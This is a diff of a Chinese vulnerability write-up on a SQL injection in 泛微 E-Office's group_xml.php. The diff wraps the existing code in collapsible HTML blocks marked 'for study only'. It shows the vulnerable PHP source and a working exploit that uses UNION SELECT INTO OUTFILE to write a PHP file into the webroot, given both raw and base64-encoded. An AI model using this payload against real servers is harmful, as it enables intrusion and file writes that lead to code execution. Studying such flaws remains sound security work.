@@ -35,8 +35,10 @@ app="泛微-EOffice"
 
 存在漏洞的文件为 `inc/group_user_list/group_xml.php`
 
-```
-session_start( );
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">session_start( );
 include_once( "inc/conn.php" );
 include_once( "inc/xtree_xml.inc.php" );
 include_once( "inc/utility_all.php" );
@@ -44,7 +46,7 @@ header( "Expires: Mon, 26 Jul 1997 05:00:00 GMT" );
 header( "Cache-Control: no-cache, must-revalidate" );
 header( "Pragma: no-cache" );
 header( "Content-Type: text/xml" );
-$pararr = explodestpar( $_REQUEST['par'] );
+$pararr = explodestpar( &#36;_REQUEST['par'] );
 $groupid = $pararr['groupid'];
 if ( $groupid == "" )
 {
@@ -52,16 +54,16 @@ if ( $groupid == "" )
 }
 $groupurl_fix = "?";
 $userurl_fix = "?";
-if ( 0 < strpos( $pararr['group_url'], "?" ) )
+if ( 0 &lt; strpos( $pararr['group_url'], "?" ) )
 {
-				$groupurl_fix = "&";
+				$groupurl_fix = "&amp;";
 }
-if ( 0 < strpos( $pararr['user_url'], "?" ) )
+if ( 0 &lt; strpos( $pararr['user_url'], "?" ) )
 {
-				$userurl_fix = "&";
+				$userurl_fix = "&amp;";
 }
 $xtreeXml = new xtreeXml( );
-$xtreeXml->initXml( );
+$xtreeXml-&gt;initXml( );
 if ( $pararr['group'] == 1 )
 {
 				$sql = "SELECT * FROM pub_group WHERE GROUP_ID=".$groupid."";
@@ -72,8 +74,9 @@ else
 }
 $rs = exequery( $connection, $sql );
 $row = mysql_fetch_array( $rs );
-$groupmember = $row['GROUP_MEMBER'];
-```
+$groupmember = $row['GROUP_MEMBER'];</code></pre>
+
+</details>
 
 $groupid没有被双引号包裹，然后造成注入。然后$groupid来自于$pararr['groupid'];其中经过了$explodestpar这个函数
 
@@ -116,13 +119,16 @@ function explodeStPar( $enpar )
 
 构造EXP写入文件
 
-```
-[group]:[1]|[groupid]:[1 union select '<?php phpinfo()?>',2,3,4,5,6,7,8 into outfile '../webroot/vulntest.php']
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">[group]:[1]|[groupid]:[1 union select '&lt;?php phpinfo()?&gt;',2,3,4,5,6,7,8 into outfile '../webroot/vulntest.php']
 |
 | base64
 |
-/inc/group_user_list/group_xml.php?par=W2dyb3VwXTpbMV18W2dyb3VwaWRdOlsxIHVuaW9uIHNlbGVjdCAnPD9waHAgcGhwaW5mbygpPz4nLDIsMyw0LDUsNiw3LDggaW50byBvdXRmaWxlICcuLi93ZWJyb290L3Z1bG50ZXN0LnBocCdd
-```
+/inc/group_user_list/group_xml.php?par=W2dyb3VwXTpbMV18W2dyb3VwaWRdOlsxIHVuaW9uIHNlbGVjdCAnPD9waHAgcGhwaW5mbygpPz4nLDIsMyw0LDUsNiw3LDggaW50byBvdXRmaWxlICcuLi93ZWJyb290L3Z1bG50ZXN0LnBocCdd</code></pre>
+
+</details>
 
 ![image-20220520140654026](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201406076.png)
 
